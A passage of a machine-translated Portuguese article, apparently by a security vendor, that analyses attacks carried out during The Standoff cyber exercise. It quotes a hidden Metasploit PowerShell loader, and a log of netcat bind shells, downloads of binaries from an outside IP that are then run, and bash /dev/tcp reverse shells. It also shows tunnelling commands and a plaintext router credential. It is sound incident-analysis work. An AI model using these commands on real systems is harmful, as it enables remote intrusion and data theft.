class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Este script foi gerado pela estrutura do Metasploit.  Seu objetivo √© abrir o soquete na porta 55443 para escutar e executar a "carga √∫til" que veio a essa porta - presumivelmente Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Uma tentativa de iniciar um shell remoto foi bem-sucedida.  Depois disso, os atacantes continuaram desenvolvendo o ataque e o nome de usu√°rio cria outra conta com o nome "vitalik", adicionando-a ao grupo "Admins. Do Dom√≠nio" e logo ap√≥s sua cria√ß√£o, vemos um logon interativo. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  Enquanto a vitalik criou o servi√ßo com o mesmo script PowerShell que o nome de usu√°rio, o nome de usu√°rio redefiniu massivamente as senhas da conta de dom√≠nio e ficou interessado no servidor de email de dom√≠nio Win2008R2-EXCH vizinho. <br><br>  A atividade quase simult√¢nea de usu√°rios de nome de usu√°rio e vitalik no servidor de dom√≠nio do Exchange (varredura e login) sugere que provavelmente v√°rios membros da equipe examinaram a rede SPUTNIK ao mesmo tempo. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  O vitalik verifica a disponibilidade do servidor de correio e inicia o console de gerenciamento do servidor ap√≥s um login interativo. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  N√£o encontrando nada que valha a pena, ele arrasta sua instrumenta√ß√£o e artilharia pesada para o host Win2008R2-DC - in√∫meros scripts de powershell e a estrutura BloodHound aparecem no controlador de dom√≠nio, que √© uma ferramenta popular para reconhecimento nas redes do Active Directory.  Para acessar a interface da web do BloodHound, o participante teve que desativar o modo protegido no IE, que tamb√©m foi detectado pelo SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  A atividade BloodHound na rede n√£o passou pelo PT NAD.  Um dos recursos da ferramenta era verificar hosts na rede em busca de conex√µes ativas.  Esse tr√°fego para o servi√ßo SRVSVC √© detectado por uma das assinaturas do PT NAD e indica intelig√™ncia dentro da rede: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Por volta de uma da manh√£, os atacantes, depois de criarem uma c√≥pia de sombra do disco usando o utilit√°rio vssadmin, arrastaram o banco de dados ntds.dit contendo todas as contas de dom√≠nio.  Depois de concluir esse ataque com sucesso, os atacantes assumem o controle completamente do dom√≠nio, recebendo o hash da conta especial ‚Äúkrbtgt‚Äù √† sua disposi√ß√£o.  A propriedade desta conta permite criar e usar o chamado.  Golden Ticket - t√≠quete Kerberos para acesso ilimitado aos recursos no dom√≠nio, acesso aos servidores em nome de qualquer usu√°rio existente e at√© inexistente e qualquer a√ß√£o no dom√≠nio.  O uso do Golden Ticket √© bastante dif√≠cil de detectar usando equipamento de prote√ß√£o, mas comprometer os links krbtgt e ntds.dit √© muito mais f√°cil de detectar. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  A equipe est√° passando gradualmente da pesquisa de dom√≠nio para a rede automatizada de sistema de controle de processo que foi aberta.  Depois de arrastar os scanners Nmap para os funcion√°rios da SPUTNIK - YLAVRENTIEV.sputnik.phd e EPONOMAREV.sputnik.phd, as redes foram varridas 172.20.xx. Os participantes usaram <a href="">nmap_performance.reg</a> para alterar os par√¢metros TCP / IP da pilha de janelas e acelerar a varredura da rede de controle de processos. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  As conex√µes com os hosts no sistema de controle autom√°tico de processo da rede atrav√©s dos t√∫neis nos hosts do dom√≠nio SPUTNIK falam por si.  Uma descri√ß√£o do que os hackers fizeram na rede industrial pode ser encontrada no v√≠deo de nossos colegas no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">YouTube</a> . <br><br>  Entre as outras conquistas dos atacantes, outros t√∫neis, sess√µes ssh, avan√ßos criativos ap√≥s uma noite sem dormir no primeiro dia da competi√ß√£o e, √© claro, mineiros de jogos estabelecidos que mineravam a moeda DDOS Coin tamb√©m foram observados. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Localizado no escrit√≥rio n¬∫ 1 da DMZ e orgulhosamente desempenhou seu papel at√© o meio-dia, foi invadido por uma equipe n√£o identificada. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  N√£o foi dif√≠cil encontrar credenciais de administrador e a equipe usou a funcionalidade zabbix interna para expandir ilimitadamente os recursos de monitoramento usando scripts personalizados. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Voc√™ pode usar qualquer comando linux nos scripts, que √© o que as equipes membros usaram para criar shells e proxies de Socks. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  A equipe tentou baixar o m√≥dulo do servidor sob controle 195.16.61.232, mas sem sucesso: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Depois de um pouco de explora√ß√£o do ambiente, instalei um shell bash remoto usando ferramentas linux padr√£o com o mesmo servidor, enviando pacotes diretamente para / dev / tcp /. <br><br>  N√£o menos interessante foi o conte√∫do do tr√°fego entre a equipe e os proj√©teis, que foi transmitido de forma clara e n√£o passou pelos sensores PT NAD. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Como podemos ver, o servidor ZABBIX foi usado principalmente como ponte para o reconhecimento das sub-redes de escrit√≥rios n¬∫ 1: 10.100.50.0/24 (Usu√°rios), 10.100.60.0/24 (Servidores) e 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiserver (100.64.100.167) </h2><br>  O Multiserver √© outro host Linux no escrit√≥rio n¬∫ 1 da DMZ, com um par de servidores HTTP e um banco de dados MySQL a bordo.  Embora o multiserver tenha sido submetido a uma varredura intensiva, houve apenas alguns ataques bem-sucedidos.  O host continha a vulnerabilidade SambaCry 2017, encontrada ap√≥s as vulnerabilidades MS17-010, e as equipes tentaram us√°-la.  O filtro PT NAD permite localizar suas tentativas na linha do tempo: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  O carregamento em uma das tentativas do comando n¬∫ 3 foi a biblioteca execut√°vel DTECJtAf.so.  E, julgando pelo nome da biblioteca, os membros da equipe usaram o m√≥dulo is_known_pipename do Metasploit Framework.  Prova: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  Durante o confronto, os especialistas foram assistidos pelo PT MultiScanner, que verificou todos os arquivos voando pela rede que foram notados pelo PT NAD.  Ap√≥s alguns momentos, ele emite um veredicto para o DTECJtAf.so voando pela rede: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  A julgar pela falta de intera√ß√µes de rede adicionais entre o servidor e o comando n¬∫ 3, a explora√ß√£o n√£o trouxe sucesso.  No entanto, quase ao mesmo tempo, vemos uma sess√£o SSH ativa da equipe n¬∫ 4.  Pelo volume de tr√°fego transmitido, podemos julgar que os invasores usaram o servidor ao m√°ximo. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  De um modo geral, o primeiro login SSH bem-sucedido do usu√°rio administrador da equipe n¬∫ 4 aconteceu por volta das 15h20 do primeiro dia da competi√ß√£o: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Como qualquer invasor decente, o login √© seguido pela verifica√ß√£o de privil√©gios e reconhecimento no host: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  E al√©m: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Com facilidade, realizamos a atribui√ß√£o do invasor pelo idioma: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  O multiservidor n√£o recebeu a configura√ß√£o adequada e n√£o se sabe ao certo quais outras tentativas as equipes fizeram.  A julgar pelos logs dispon√≠veis, esse host, assim como outros hosts no escrit√≥rio n¬∫ 1 da DMZ, serviu como ponto de partida para explorar a infraestrutura interna do escrit√≥rio. <br><br><h2>  Mis </h2><br>  Outros anfitri√µes tamb√©m se tornaram o foco de aten√ß√£o das equipes.  Por exemplo, os participantes se comportaram com curiosidade em rela√ß√£o ao roteador Mikrotik em 100.64.100.237 na rede DMZ do Office # 1.  Por volta das duas horas da manh√£ do segundo dia do confronto, um login bem-sucedido no console do roteador Telnet com o par "admin: VxPvRxX74e8xrbia77hsi7WKm" foi bem-sucedido.  A vers√£o do firmware do dispositivo era 6.38.4 - esta √© a vers√£o na qual foi testada a famosa explora√ß√£o do Chimay Red Stack Clash para Mikrotik, que permitiu executar qualquer c√≥digo no dispositivo e, em particular, extrair senhas de usu√°rios no roteador.  Uma vulnerabilidade de explora√ß√£o foi descoberta pelo PT NAD. <br><br>  Mas ent√£o, na √°rea de almo√ßo, a equipe que primeiro pegou o roteador decidiu fechar o buraco com uma simples atualiza√ß√£o de firmware e monopolizar o acesso: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  Este √© um dos poucos exemplos em que uma equipe de participantes fecha um buraco no sistema para que outras equipes n√£o possam capturar esse host. <br><br>  O PT MultiScanner detectou um evento curioso: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Para acessar o banco, as equipes podem usar o cliente do banco dispon√≠vel no site.  O site est√° localizado na rede banc√°ria, sob a supervis√£o de uma equipe de defensores, e eles <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">constru√≠ram o</a> cliente usando a estrutura Metasploit e a substitu√≠ram pela original.  Felizmente para os defensores, o cliente interno foi baixado por v√°rias equipes, como podemos ver na captura de tela do PT MultiScanner acima.  Nenhuma conex√£o bem-sucedida foi notada, mas vale a pena mencionar o caso, porque esses cen√°rios ocorrem nos programas Trojan de invasores da vida comum em sites oficiais ou substituem as atualiza√ß√µes para lan√ßar ataques aos clientes. <br><br><h2>  Mineiros </h2><br>  Outra inova√ß√£o em The Standoff foi o advento dos mineiros de jogos.  Segundo a lenda, as equipes poderiam usar os servidores capturados como mineradores, o que lhes trouxe pontos extras.  Em vez de criptomoedas tradicionais, eles extra√≠ram o DDoS Coin - a moeda equivalente ao esfor√ßo gasto em um ataque DDoS a um servidor.  Os dados dos handshakes TLS 1.2 serviram como prova de trabalho e quanto mais o mineiro fazia handshakes TLS com o servidor de destino, maior era a probabilidade de encontrar um novo bloco e receber sua recompensa do organizador do ataque DDoS. <br><br>  O cliente foi escrito em Go e poderia funcionar no Windows e Linux.  A id√©ia foi aplicada pela primeira vez e, embora nem todas as equipes tenham conseguido aplic√°-la, as tentativas de inici√°-lo foram vistas em muitos servidores da infraestrutura de jogos: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Tentativa de executar o minerador no n√≥ Joomla (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Executando o mineiro a partir da infraestrutura SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Como parte do jogo, as equipes podem minerar criptomoeda e troc√°-lo por pontos de jogo.  Metade das equipes conseguiu usar os servidores capturados anteriormente para extrair blocos.  Havia tamb√©m um componente de troca na l√≥gica do jogo - com uma mudan√ßa acentuada na quantidade de moeda extra√≠da, sua taxa de c√¢mbio diminuiu.  Assim, foi poss√≠vel realizar opera√ß√µes especulativas e ganhar pontos sem concluir tarefas b√°sicas.  Mas como essa id√©ia n√£o foi aplicada anteriormente em tais jogos, as equipes n√£o puderam us√°-la adequadamente e isso n√£o afetou significativamente o curso do jogo. <br><br>  Em termos de n√∫mero de blocos minerados, a equipe do Cazaquist√£o CARKA assumiu a lideran√ßa, que foi a primeira a lan√ßar mineradores na infraestrutura de jogos.  Aqui fomos capazes de nos afastar dos n√∫meros de rede das equipes para seus nomes devido ao fato de que seus identificadores inclu√≠am informa√ß√µes sobre o bloco e foram levados em considera√ß√£o ao calcul√°-los.  Em geral, a ideia se mostrou boa, e com certeza pode ser vista no pr√≥ximo The Standoff. <br><br><h2>  Em vez de sa√≠da </h2><br>  Last Standoff foi quente - 12 equipes exploraram ativamente e invadiram a infraestrutura da cidade.  Nossos produtos nos permitiram "espionar" exatamente como os participantes do jogo agiram, quais t√°ticas e ferramentas eles escolheram e qual se tornou seu objetivo.  Testemunhamos como eles interagiram com a infraestrutura de dom√≠nio do escrit√≥rio, come√ßando com a infec√ß√£o de uma m√°quina e terminando com a apreens√£o de todo o dom√≠nio e a transi√ß√£o para a pr√≥xima rede ACS.  Durante um evento como o The Standoff, os produtos t√™m uma carga enorme: o MaxPatrol SIEM lidou com 20.000 EPS e o PT NAD processou mais de 3 terabytes de tr√°fego de rede nos dois dias, sem mencionar a pr√≥pria infraestrutura de rede: roteadores, comutadores e firewalls. <br><br>  Esse comprometimento de escrit√≥rios virtuais poderia acontecer com escrit√≥rios reais sem os meios adequados de prote√ß√£o e controle.  Como regra, isso leva ao vazamento de dados valiosos, como correspond√™ncia, dados financeiros e dados pessoais de funcion√°rios / usu√°rios. <br><br>  Entre as in√∫meras varreduras, brutamontes e tentativas de explorar todos os tipos de vulnerabilidades, os produtos ajudaram a determinar como os servidores de infraestrutura de jogos foram invadidos.  Foram determinados ataques bem-sucedidos e tra√ßos de comprometimento bem-sucedido, como shells da web, consoles remotos, t√∫neis e logins de host.  Tudo isso ajuda os especialistas a melhorar os produtos. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  Nesta captura de tela das estat√≠sticas das conex√µes VPN das equipes durante o jogo, voc√™ pode ver como o The Standoff era internacional: as conex√µes VPN foram estabelecidas com servidores nos Estados, Cazaquist√£o, Holanda e metade da Europa!  A prop√≥sito, n√£o havia equipes dos Estados Unidos ou da Europa no The Standoff, mas havia uma equipe do Cazaquist√£o. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt418335/">https://habr.com/ru/post/pt418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt418323/index.html">Um pouco sobre os atributos dos hosts, teclado, c√≥digo e SCS da s√©rie "Mundo do Oeste Selvagem" (Westworld)</a></li>
<li><a href="../pt418327/index.html">Sapateiros com botas: quais smartphones os especialistas escolhem para si</a></li>
<li><a href="../pt418329/index.html">Organiza√ß√£o de testes seguros na produ√ß√£o. Parte 2</a></li>
<li><a href="../pt418331/index.html">Mestres de servidores e redes - feliz feriado</a></li>
<li><a href="../pt418333/index.html">Rob√¥s Uber est√£o voltando para a estrada, mas as pessoas os guiar√£o</a></li>
<li><a href="../pt418337/index.html">DataGrip quente e de ver√£o 2018.2</a></li>
<li><a href="../pt418339/index.html">Manipulador "Manual"</a></li>
<li><a href="../pt418341/index.html">Feliz dia do administrador do sistema! Cart√£o com significado</a></li>
<li><a href="../pt418345/index.html">Documenta√ß√£o de formatos de troca de informa√ß√µes - f√°cil e simples</a></li>
<li><a href="../pt418347/index.html">Como eu escrevi a biblioteca C ++ 11 padr√£o ou por que o impulso √© t√£o assustador? Cap√≠tulo 4.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>